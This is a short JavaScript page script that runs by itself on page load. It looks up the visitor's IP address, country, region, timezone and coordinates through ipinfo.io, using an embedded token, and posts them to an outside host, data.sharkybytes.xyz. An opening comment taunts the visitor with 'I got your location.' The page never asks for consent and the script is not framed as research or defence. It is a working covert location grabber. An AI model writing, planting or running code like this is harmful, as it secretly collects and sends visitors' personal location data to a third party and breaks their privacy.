//** It's too late now, I got your location. */ //

// POST METHOD FUNCTION //
async function postRequest() {
    const apiURL = 'https://data.sharkybytes.xyz/'; // API URL
    const request = await fetch("https://ipinfo.io/json?token=0282fbb2286a84"); // LOCATOR URL
    const { ip, country, region, timezone, loc } = await request.json();
    const postData = {
        'IPv4': ip,
        'country': country,
        'region': region,
        'timezone': timezone,
        'coordinates': loc
    } // Data To Post
     try {
        const response = await fetch(apiURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(postData), // Convert data to JSON Format
        });

        const result = await response.json(); // Parse JSON Response
        document.getElementById("response").textContent = JSON.stringify(result, null, 2);
     } catch (error) {
        console.error(error)
     }
}
window.onload = function() {
    postRequest();
}